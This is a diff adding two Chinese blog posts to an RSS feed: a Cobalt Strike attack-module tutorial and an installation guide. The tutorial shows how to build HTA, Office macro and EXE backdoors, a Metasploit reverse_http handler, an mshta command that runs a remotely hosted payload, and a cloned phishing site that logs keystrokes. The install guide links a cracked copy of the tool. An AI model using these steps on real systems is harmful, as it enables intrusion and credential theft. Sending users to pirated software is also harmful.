@@ -10,9 +10,507 @@
         </author>
         <description>临渊羡鱼，不如退而结网</description>
         <language>zh-CN</language>
-        <pubDate>Sat, 19 Jun 2021 07:52:01 +0800</pubDate>
-        <lastBuildDate>Sat, 19 Jun 2021 07:52:01 +0800</lastBuildDate>
+        <pubDate>Wed, 07 Jul 2021 14:27:57 +0800</pubDate>
+        <lastBuildDate>Wed, 07 Jul 2021 14:27:57 +0800</lastBuildDate>
         <category term="学习" />
+        <item>
+            <guid isPermalink="true">https://self-ferry.github.io/2021/07/07/CobaltStrike%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8/</guid>
+            <title>CobaltStrike攻击模块的使用</title>
+            <link>https://self-ferry.github.io/2021/07/07/CobaltStrike%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8/</link>
+            <category term="CobaltStrike" scheme="https://self-ferry.github.io/categories/CobaltStrike/" />
+            <category term="CobaltStrike" scheme="https://self-ferry.github.io/tags/CobaltStrike/" />
+            <pubDate>Wed, 07 Jul 2021 14:27:57 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;attacks模块简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#attacks模块简介&#34;&gt;#&lt;/a&gt; Attacks 模块简介&lt;/h1&gt;
+&lt;h2 id=&#34;packages模块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#packages模块&#34;&gt;#&lt;/a&gt; packages 模块&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;HTML Application 　　　　　　 生成一个恶意 HTML Application 木马，后缀格式为 .hta。通过 HTML 调用其他语言的应用组件进行攻击，提供了可执行文件、PowerShell、VBA 三种方法&lt;br /&gt;
+ MS Office Macro 　　　　　　   生成 office 宏病毒文件；&lt;br /&gt;
+Payload Generator 　　　　　   生成各种语言版本的 payload，可以生成基于 C、C#、COM Scriptlet、Java、Perl、PowerShell、Python、Ruby、VBA 等的 payload&lt;br /&gt;
+Windows Executable 　　　　　生成 32 位或 64 位的 exe 和基于服务的 exe、DLL 等后门程序&lt;br /&gt;
+ Windows Executable (S)　　　　用于生成一个 exe 可执行文件，其中包含 Beacon 的完整 payload，不需要阶段性的请求。与 Windows Executable 模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持 powershell 脚本，可用于将 Stageless Payload 注入内存&lt;/p&gt;
+&lt;h2 id=&#34;web-drive-by-网站钓鱼攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-drive-by-网站钓鱼攻击&#34;&gt;#&lt;/a&gt; Web Drive-by 网站钓鱼攻击&lt;/h2&gt;
+&lt;p&gt;点击中间的 Attacks——&amp;gt; Web Drive-by（网站钓鱼攻击）&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image002.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Manage　　　　　　　　　　 对开启的 web 服务进行管理；&lt;br /&gt;
+Clone Site 　　 　　　　　克隆网站，可以记录受害者提交的数据；&lt;br /&gt;
+Host File 　　　　　　　　提供一个文件下载，可以修改 Mime 信息；Host File 可以配合 DNS 欺骗实现挂马效果使用&lt;br /&gt;
+ Scripted Web Delivery    基于 Web 的攻击测试脚本，自动生成可执行的 payload ;&lt;br /&gt;
+Signed Applet Attack 　　启动一个 Web 服务以提供自签名 Java Applet 的运行环境；&lt;br /&gt;
+Smart Applet Attack 　　自动检测 Java 版本并 l 利用已知的 exploits 绕过 security；&lt;br /&gt;
+System Profiler　　　　　用来获取一些系统信息，比如系统版本，Flash 版本，浏览器版本等。&lt;br /&gt;
+Spear Phish 　　　　　　　用来邮件钓鱼的模块&lt;/p&gt;
+&lt;h1 id=&#34;cobaltstrike-attacks模块的利用方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cobaltstrike-attacks模块的利用方法&#34;&gt;#&lt;/a&gt; CobaltStrike Attacks 模块的利用方法&lt;/h1&gt;
+&lt;h2 id=&#34;msf与cobaltstrike结合获取meterpreter&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msf与cobaltstrike结合获取meterpreter&#34;&gt;#&lt;/a&gt; MSF 与 CobaltStrike 结合获取 meterpreter&lt;/h2&gt;
+&lt;p&gt;在 CobaltStrike 中的 Listenter 中有一些 Foreign 的载荷（payload），常用于于 MSF 结合&lt;/p&gt;
+&lt;p&gt;创建 Beacon Listener&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;CobaltStrike -&amp;gt;  Listener -&amp;gt;  add -&amp;gt;  payload 选择 Foregin (windows/foregin/reverse_http) -&amp;gt;  msf 攻击机 ip/msf 监听端口 (192.168.199.145:4444)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;在攻击机上进行 msf 监听&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;use exploit/multi/handler&lt;br /&gt;
+set payload windows/meterpreter/reverse_http&lt;br /&gt;
+set lhost 192.168.199.145&lt;br /&gt;
+set lport 4444&lt;br /&gt;
+run/exploit&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;生成攻击文件在目标机器运行既可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image003.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;利用web服务远程加载文件获取beacon&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用web服务远程加载文件获取beacon&#34;&gt;#&lt;/a&gt; 利用 web 服务，远程加载文件，获取 beacon&lt;/h2&gt;
+&lt;p&gt;利用 &lt;code&gt;Attack -&amp;gt;  packeg&lt;/code&gt;  中的 &lt;code&gt;HTML Application&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;一个 &lt;code&gt;HTML Application&lt;/code&gt; （HTML 应用）是一个使用 HTML 和一个 Internet 浏览器支持的脚本语言编写的 Windows 程序。该程序包生成一个 HTML 应用，该应用运行一个 &lt;code&gt;Cobalt Strike payload&lt;/code&gt; 。你可以选择一个 HTML 应用，此 HTML 应用使得一个可执行文件落地在磁盘上并运行它。选择 &lt;code&gt;powershell&lt;/code&gt;  选项来得到一个 HTML 应用，该应用应该使用 &lt;code&gt;Powershell&lt;/code&gt;  来运行一个 &lt;code&gt;payload&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;新建一个 &lt;code&gt;Linsenter&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;CobaltStrike -&amp;gt;  Listener -&amp;gt;  add -&amp;gt;  payload 选择 (windows/beacon_http/reverse_http)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;创建一个.hta 的恶意文件&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Attacks -&amp;gt;  Package -&amp;gt;  HTML Application -&amp;gt;  选择 Listener -&amp;gt;  method 选择 powershell -&amp;gt;  Generate&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;加载本地文件到服务端，进行 web 服务&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Attacks -&amp;gt;  Web Drive-by -&amp;gt;  Host File -&amp;gt;  File 选择本地生成的.hta 文件&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;目标机 cmd.exe 中运行以下命令（白名单文件 mshta.exe 无免杀，在加载.hta 文件时可被多种杀软查杀)(mshta.exe 是微软 Windows 操作系统相关程序，用于执行.HTA 文件，或在批处理中结合其他语言的代码；如：mshta javascript，可用于运行一个 HTML 网页而不会出现安全警告。)&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;mshta &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1pcCstMHkzZTE4OW8vZG93bmxvYWQvZmlsZS5leHQ=&#34;&gt;http://ip + 端口 /download/file.ext&lt;/span&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;image004.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;靶机上线。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image005.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;ms-office-macro-宏获取beacon&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ms-office-macro-宏获取beacon&#34;&gt;#&lt;/a&gt; MS Office Macro 宏获取 beacon&lt;/h2&gt;
+&lt;p&gt;利用 Attack -&amp;gt;  Package -&amp;gt;  MS office Macro&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;MS office Macro&lt;/code&gt;  模块提供一个 &lt;code&gt;Microsoft Office&lt;/code&gt;  的宏文件，并提供嵌入 &lt;code&gt;Microsoft World&lt;/code&gt;  或 &lt;code&gt;Microsoft Excel&lt;/code&gt;  的说明&lt;/p&gt;
+&lt;p&gt;新建一个 &lt;code&gt;Linsenter&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;CobaltStrike -&amp;gt;  Listener -&amp;gt;  add -&amp;gt;  payload 选择 (windows/beacon_http/reverse_http)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;利用 &lt;code&gt;MS Office Macro&lt;/code&gt;  模块获取宏&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Attack -&amp;gt;  Package -&amp;gt;  MS office Macr&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;将获取的宏嵌入到文档当中&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Microsoft World 文档 -&amp;gt;  视图 -&amp;gt;  宏 -&amp;gt;  宏名任意 -&amp;gt;  创建 -&amp;gt;  Microsoft Visual Basic for Application 控制台 -&amp;gt;  将生成的宏复制到代码区 -&amp;gt; 保存&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;image006.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;靶机上线。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image007.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;制作钓鱼网址盗取用户输入信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#制作钓鱼网址盗取用户输入信息&#34;&gt;#&lt;/a&gt; 制作钓鱼网址盗取用户输入信息&lt;/h2&gt;
+&lt;p&gt;利用 Attack -&amp;gt;  Web Drive-by -&amp;gt; Clone Site 制作钓鱼网址&lt;/p&gt;
+&lt;p&gt;在向目标发送漏洞利用程序之前，进行伪装会有所帮助。 &lt;code&gt;Cobalt Strike&lt;/code&gt;  的网站克隆工具可以帮助此目标。网站克隆工具制作一个网站的本地的复制，使用一些增加的代码来修复连接和图像这样它们可以如预期一样工作。&lt;/p&gt;
+&lt;p&gt;建立 &lt;code&gt;Linstener&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;CobaltStrike -&amp;gt;  Listener -&amp;gt;  add -&amp;gt;  payload 选择 (windows/beacon_http/reverse_http)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;利用 &lt;code&gt;Clone Site&lt;/code&gt;  获取钓鱼网址&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Attack -&amp;gt;  Web Drive-by -&amp;gt; Clone Site -&amp;gt;  Clone Url (被克隆网址) -&amp;gt;  勾选 Log Keystroken on Cloned site&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;image008.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;利用网站日志（web Log）查看被钓鱼方输入的信息&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;View -&amp;gt;  Web Log&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;如下为被克隆网站&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image009.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;简单exe等可执行文件上线目标主机&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简单exe等可执行文件上线目标主机&#34;&gt;#&lt;/a&gt; 简单 EXE 等可执行文件上线目标主机&lt;/h2&gt;
+&lt;p&gt;利用 Attack -&amp;gt;  Packages -&amp;gt;  Windows Executable/(s)&lt;/p&gt;
+&lt;p&gt;该程序包含一个 Windows 可执行 &lt;code&gt;Artifact&lt;/code&gt; ，用于传送一个 &lt;code&gt;Payload Stager&lt;/code&gt; 。这个程序包为使用者提供了多种输出选项。 &lt;code&gt;Windows Service EXE&lt;/code&gt;  是一个 Windows 可执行文件，可响应 &lt;code&gt;Service Control Manager&lt;/code&gt;  命令。使用者可以使用这个可执行文件来作为使用 &lt;code&gt;SC&lt;/code&gt;  命令行的 Windows 服务的调用程序，或使用 &lt;code&gt;Metasploit&lt;/code&gt;  框架的 &lt;code&gt;PsExec&lt;/code&gt;  模块生成一个自定义的可执行文件。&lt;br /&gt;
+普通的 EXE 和服务器启动调用的 EXE 是由区别的，利用 &lt;code&gt;Windows Service EXE&lt;/code&gt;  生成的 EXE 才能用来作为服务自启动的 EXE，利用 &lt;code&gt;Cobalt Strike&lt;/code&gt;  中 Windows EXE 生成的 EXE 不能作为服务自启动的 EXE 程序。&lt;/p&gt;
+&lt;p&gt;创建一个监听&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;CobaltStrike -&amp;gt;  Listener -&amp;gt;  add -&amp;gt;  payload 选择 (windows/beacon_http/reverse_http)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;生成可执行程序&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Attack -&amp;gt;  Packages -&amp;gt; windows Executable/(s)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;目标机器运行可执行文件，上线目标主机&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image010.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;生成 Powershell 版的需要在目标主机的 Powershell 控制台运行该 ps1 脚本&lt;br /&gt;
+生成 dll 文件，需要在目标主机加载&lt;/p&gt;
+&lt;h2 id=&#34;利用msf结合cobalt-strike获取cs-beacon&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用msf结合cobalt-strike获取cs-beacon&#34;&gt;#&lt;/a&gt; 利用 MSF 结合 Cobalt Strike 获取 CS beacon&lt;/h2&gt;
+&lt;p&gt;在 0x01 部分，我们知道 Cobalt Strike 可以与 MSF 配合获取 meterpreter，当然，二者也可以相互配合获取 Beacon。&lt;/p&gt;
+&lt;p&gt;你可以使用 MSF 中的 &lt;code&gt;exploit/windows/local/payload_inject&lt;/code&gt;  模块将 MSF 获取的 &lt;code&gt;meterpreter&lt;/code&gt;  传送给 &lt;code&gt;Cobalt Strike&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Cobalt Strike 新建一个 &lt;code&gt;Listener&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;CobaltStrike -&amp;gt;  Listener -&amp;gt;  add -&amp;gt;  payload 选择 (windows/beacon_http/reverse_http)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;MSF 获取目标 &lt;code&gt;meterpreter&lt;/code&gt; &lt;br /&gt;
+ 将 &lt;code&gt;meterpreter&lt;/code&gt;  利用 &lt;code&gt;exploit/windows/local/payload_inject&lt;/code&gt;  模块传送给 CS&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;background&lt;br /&gt;
+use exploit/windows/local/payload_inject&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;设定 CS 的 ip 和监听端口&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;set LHOST CSip&lt;br /&gt;
+set LPORT CS Listener 监听端口&lt;br /&gt;
+ set disablepayloadhandler true&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;image011.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;设定传送的 &lt;code&gt;session&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;set session id&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;session id 可输入 &lt;code&gt;sessions&lt;/code&gt;  查看&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image012.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;运行即可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image013.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;payload-generatorpayload-生成器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload-generatorpayload-生成器&#34;&gt;#&lt;/a&gt; Payload Generator (Payload 生成器)&lt;/h2&gt;
+&lt;p&gt;该模块可以生成 n 中语言的后门 Payload，包括 C,C#,Python,Java,Perl,Powershell 脚本，Powershell 命令，Ruby,Raw，免杀框架 Veli 中的 shellcode 等等... 这是 CS 的一个很大的迷人之处。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;attack -&amp;gt;  Packages -&amp;gt;  payload Generator&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;image014.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;强化cobalt-strike&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#强化cobalt-strike&#34;&gt;#&lt;/a&gt; 强化 Cobalt strike&lt;/h1&gt;
+&lt;p&gt;Cortana 是可以用于 Cobalt strike 以及 Armitage 的脚本，通过加载 cortana 可以向 Cobalt strike 中导入新的第三方工具，最大的好处就是各种第三方工具都进行了可视化，你可以通过点击而不是通过命令行来完成一些操作，当然，通过定制 cortana 脚本，你可以在渗透测试过程中很方便的做一些批量操作或者自动化攻击等。&lt;/p&gt;
+&lt;p&gt;扩展：&lt;/p&gt;
+&lt;p&gt;Aggressor Script 是 Cobalt Strike 3.0 版及更高版本中内置的脚本语言。Aggresor 脚本允许您修改和扩展 Cobalt Strike 客户端。&lt;/p&gt;
+&lt;p&gt;Aggressor Script 是 Armitage 中开源脚本引擎 Cortana 的精神继任者。Cortana 是通过 DARPA 的 “网络快速通道” 计划的合同而成为可能的。Cortana 允许其用户通过 Armitage 的团队服务器扩展 Armitage 并控制 Metasploit 框架及其功能。Cobalt Strike 3.0 是对 Cobalt Strike（无 Armitage）基础的完全重写。这一更改提供了重新审视 Cobalt Strike 脚本并围绕 Cobalt Strike 功能构建内容的机会。这项工作的结果是 Aggressor Script。&lt;/p&gt;
+&lt;p&gt;也就是说 Cobalt Strike 3.0 版本之后是 Aggressor。&lt;/p&gt;
+&lt;p&gt;下载 cortana-scripts：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;git clone &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JzbXVkZ2UvY29ydGFuYS1zY3JpcHRzLmdpdA==&#34;&gt;https://github.com/rsmudge/cortana-scripts.git&lt;/span&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;beef&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#beef&#34;&gt;#&lt;/a&gt; Beef&lt;/h2&gt;
+&lt;p&gt;Beef 是一款针对浏览器的渗透测试工具，而 beef_strick 则是可以在 Cobalt strike 及 Armitage 中加载 Beef 的一个 Cortana 脚本，要使用此脚本，首先要先下载安装 msf 的 beef 插件。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;git clone &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3hudHJpay9iZWVmbWV0YXNwbG9pdHBsdWdpbi5naXQ=&#34;&gt;https://github.com/xntrik/beefmetasploitplugin.git&lt;/span&gt;&lt;br /&gt;
+cd beefmetasploitplugin&lt;br /&gt;
+cp -R lib/* /usr/share/metasploit-framework/lib/&lt;br /&gt;
+gem install hpricot&lt;br /&gt;
+gem install json&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;安装依赖库，执行：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;gem install hpricot&lt;br /&gt;
+gem install json&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;image015.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;启动 msf 加载 beef&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;msf6 &amp;gt; load beef&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;若遇到此问题&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image016.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这样解决。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;cp -R /var/lib/gems/2.7.0/gems/hpricot-0.8.6/lib/* /usr/lib/ruby/vendor_ruby&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;image017.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里注意若出现以下报错：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image018.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;则要结合自己实际情况，例：查看 gems 目录下的文件名、hpricot-x.x.x。&lt;/p&gt;
+&lt;p&gt;现在再启动 msf，就可以加载 beef 了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image019.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;cs免杀-mac写入内存&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cs免杀-mac写入内存&#34;&gt;#&lt;/a&gt; CS 免杀 - MAC 写入内存&lt;/h2&gt;
+&lt;h1 id=&#34;reference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#reference&#34;&gt;#&lt;/a&gt; Reference&lt;/h1&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueXVxdWUuY29tL3ppcmMwbi9lc2NiaGcvcXhnZm51&#34;&gt;https://www.yuque.com/zirc0n/escbhg/qxgfnu&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93aWtpLndncHNlYy5vcmcva25vd2xlZGdlL2ludHJhbmV0L0NvYmFsdC1TdHJpa2UuaHRtbA==&#34;&gt;https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuNzcxNjkubmV0L2h0bWwvMjUzMjIxLmh0bWw=&#34;&gt;https://www.77169.net/html/253221.html&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://self-ferry.github.io/2021/07/06/CobaltStrike%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/</guid>
+            <title>CobaltStrike的安装和配置</title>
+            <link>https://self-ferry.github.io/2021/07/06/CobaltStrike%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/</link>
+            <category term="CobaltStrike" scheme="https://self-ferry.github.io/categories/CobaltStrike/" />
+            <category term="CobaltStrike" scheme="https://self-ferry.github.io/tags/CobaltStrike/" />
+            <pubDate>Tue, 06 Jul 2021 16:58:41 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
+&lt;p&gt;Cobalt Strike 是一款内网渗透测试工具，常被业界人称为 CS。Cobalt Strike 2.0 版本主要是结合 Metasploit 可以称为图形化 MSF 工具。而 Cobalt Strike 3.0 已经不再使用 Metasploit 框架而作为一个独立的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。客户端模式和服务端模式可以在 Windows 以及 Linux 上运行。&lt;br /&gt;
+Cobalt Strike 集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe 木马生成，win dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等等&lt;/p&gt;
+&lt;h1 id=&#34;安装cobaltstrike&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安装cobaltstrike&#34;&gt;#&lt;/a&gt; 安装 CobaltStrike&lt;/h1&gt;
+&lt;p&gt;有能力的可以支持一下正版 Cobalt Strike 官网: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY29iYWx0c3RyaWtlLmNvbQ==&#34;&gt;https://www.cobaltstrike.com&lt;/span&gt;。&lt;/p&gt;
+&lt;p&gt;没有能力我们就用学 (po) 习 (jie) 版。&lt;/p&gt;
+&lt;p&gt;链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWZiMXBTTmZGVWFjT2hxVlQ5b3BsaEE=&#34;&gt;https://pan.baidu.com/s/1fb1pSNfFUacOhqVT9oplhA&lt;/span&gt;&lt;br /&gt;
+ 提取码：rolr&lt;/p&gt;
+&lt;p&gt;这个是 Linux 版本&lt;br /&gt;
+下载解压后文件如下：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;目录结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目录结构&#34;&gt;#&lt;/a&gt; 目录结构&lt;/h1&gt;
+&lt;pre&gt;&lt;code&gt;│  cobaltstrike.jar 【主体程序、客户端启动程序】
+│  teamserver  【Linux服务端启动程序(linux shell脚本)】
+|─third-party 第三方工具 【vnc远程功能的dll】
+|        README.vncdll.txt
+|        winvnc.x64.dll 【vnc服务端dllx64位】
+|        winvnc.x86.dll 【vnc服务端dllx86位】
+│  agscript 【拓展应用的脚本】
+│  c2lint  【检查c2配置文件的语法和预览】
+|  peclone 【用来解析dll】
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;客户端与服务端的连接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#客户端与服务端的连接&#34;&gt;#&lt;/a&gt; 客户端与服务端的连接&lt;/h1&gt;
+&lt;p&gt;Cobalt Strike 使用 C/S 架构，Cobalt Strike 的客户端连接到团队服务器，团队服务器连接到目标，也就是说 Cobalt Strike 的客户端不与目标服务器进行交互。&lt;/p&gt;
+&lt;h2 id=&#34;启动服务端&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#启动服务端&#34;&gt;#&lt;/a&gt; 启动服务端&lt;/h2&gt;
+&lt;p&gt;cobaltstrike.jar 既是服务端程序也是客户端程序，一般情况 Linux 用 teamserver 启动服务端。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;teamserver &amp;lt;host&amp;gt; &amp;lt;password&amp;gt; [/path/to/c2.profile] [YYYY-MM-DD]
+
+    &amp;lt;host&amp;gt; is the (default) IP address of this Cobalt Strike team server
+    &amp;lt;password&amp;gt; is the shared password to connect to this server
+    [/path/to/c2.profile] is your Malleable C2 profile
+    [YYYY-MM-DD] is a kill date for Beacon payloads run from this server
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;第一个参数为服务器监听 IP 地址 此选项为必填选项&lt;/p&gt;
+&lt;p&gt;第二个参数为服务器连接密码客户端使用此密码连接服务器 此选项为必填选项&lt;/p&gt;
+&lt;p&gt;第三个参数为 Malleable C2 profile 配置文件如果不使用可以不用填写 此选项为可选选项&lt;br /&gt;
+这是开源的 Malleable C2 profile 文件&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JzbXVkZ2UvTWFsbGVhYmxlLUMyLVByb2ZpbGVz&#34;&gt; https://github.com/rsmudge/Malleable-C2-Profiles&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;第四个参数为 Beacon 有效负载运行结束日期。如果设置此选项则 CS 生成的每个 Beacon stage 中都将嵌入此结束日期，Beacon payload 在此日期后将拒绝运行，处于 sleep 状态的 Beacon payload 醒来后也将自动退出结束运行 此选项为可选选项&lt;/p&gt;
+&lt;p&gt;例:&lt;img data-src=&#34;image002.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;启动客户端&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#启动客户端&#34;&gt;#&lt;/a&gt; 启动客户端&lt;/h2&gt;
+&lt;p&gt;使用此命令可以直接运行&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;java -Dfile.encoding=UTF-8 -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;为了方便我们把这句话保存在 &lt;code&gt;start.sh&lt;/code&gt;  的 shell 脚本里面。&lt;/p&gt;
+&lt;p&gt;当 Cobalt Strike 客户端启动时，你会看到一个连接对话框&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image003.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
